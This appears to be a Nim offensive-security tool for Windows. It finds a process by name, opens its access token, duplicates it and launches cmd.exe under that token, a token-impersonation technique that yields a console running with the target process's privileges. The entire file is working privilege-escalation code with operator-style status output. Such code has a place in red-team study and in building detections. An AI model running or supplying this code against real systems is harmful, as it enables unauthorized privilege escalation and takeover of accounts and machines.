import winim
import strutils

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcessPid(name: string): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == name:
                return int(entry.th32ProcessID)

    return 0

when isMainModule:
    var name: string = readLine(stdin)
    let processId: int = GetProcessPid(name)
    if not bool(processId):
        echo "[X] Unable to find: ", name, " process"
        quit(1)
    else:
        echo "[*] Found ", name, " with PID: ", processId

    var
      process_token: HANDLE
      duplicateTokenHandle: HANDLE
      si: STARTUPINFO
      pi: PROCESS_INFORMATION

    var hProcess: HANDLE = OpenProcess(MAXIMUM_ALLOWED, false, cast[DWORD](processId));
    if not (bool)hProcess:
      raise newException(Exception, "Cannot open process ($1)" % [$GetLastError()])
    else:
      echo "[*] Succeeded opening handle on ", name, ": ", (bool)hProcess
      echo "    \\-- Handle ID is: ", hProcess  

    var getToken: HANDLE = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, cast[PHANDLE](addr(process_token)))
    if not bool(getToken):
      raise newException(Exception, "Cannot query tokens ($1)" % [$GetLastError()])
    else:
      echo "[*] Succeeded opening process token: ", (bool)getToken
      echo "    \\-- Process Token ID is: ", process_token  

    var tokenDuplication = DuplicateTokenEx(process_token, MAXIMUM_ALLOWED, NULL, securityImpersonation, tokenPrimary, &duplicateTokenHandle)
    if not bool(tokenDuplication):
      raise newException(Exception, "Cannot duplicate tokens ($1)" % [$GetLastError()])
    else:
      echo "[*] Succeeded duplicating ", name, " token: ", bool(tokenDuplication)

    var spawnConsole = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_NETCREDENTIALS_ONLY, r"C:\Windows\System32\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if not bool(spawnConsole):
      raise newException(Exception, "Cannot query tokens ($1)" % [$GetLastError()])
    else:
      echo "[*] Succeeded creating elevated command prompt: ", bool(spawnConsole)
